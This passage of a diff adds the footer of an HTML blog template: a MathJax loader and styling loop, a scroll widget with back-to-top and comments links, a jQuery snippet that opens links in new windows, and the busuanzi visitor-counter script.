+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a").attr("target", "_blank");
+        $("#scroll a, #toc a").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
